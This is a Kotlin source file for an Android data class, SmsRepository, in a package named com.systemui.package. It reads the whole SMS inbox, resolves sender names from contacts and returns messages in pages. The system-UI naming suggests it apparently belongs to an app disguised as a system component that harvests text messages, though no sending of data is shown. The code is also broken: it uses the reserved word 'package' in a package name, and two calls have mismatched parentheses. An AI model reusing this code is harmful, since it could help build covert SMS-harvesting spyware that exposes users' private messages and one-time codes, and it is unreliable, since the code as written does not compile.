package com.systemui.package.data

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import com.systemui.package.model.SmsMessage
import com.systemui.package.utils.DateUtils

object SmsRepository {
    fun getSms(context: Context, page: Int, limit: Int = 10): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        val cr: ContentResolver = context.contentResolver

        val cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")

        cursor?.use {
            val addrIdx = it.getColumnIndex("address")
            val persIdx = it.getColumnIndex("person")
            val bodyIdx = it.getColumnIndex("body")
            val dateIdx = it.getColumnIndex("date")

            val all = mutableListOf<SmsMessage>()
            while (it.moveToNext()) {
                val addr = it.getString(addrIdx) ?: ""
                if (addr.isNotBlank()) {
                    all.add(SmsMessage(
                        addr,
                        resolveContactName(context, it.getString(persIdx), addr),
                        it.getString(bodyIdx) ?: "",
                        DateUtils.formatForDisplay(DateUtils.epochToISTDateTime(it.getLong(dateIdx)))
                    )
                }
            }

            val start = (page - 1) * limit
            val end = minOf(start + limit, all.size)
            if (start < all.size) messages.addAll(all.subList(start, end))
        }
        return messages
    }

    private fun resolveContactName(context: Context, personId: String?, address: String): String {
        if (personId != null) {
            val cr = context.contentResolver
            cr.query(Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_URI, personId), 
                arrayOf("display_name"), null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val name = c.getString(c.getColumnIndex("display_name"))
                    if (!name.isNullOrBlank())) return name
                }
            }
        }
        return address
    }
}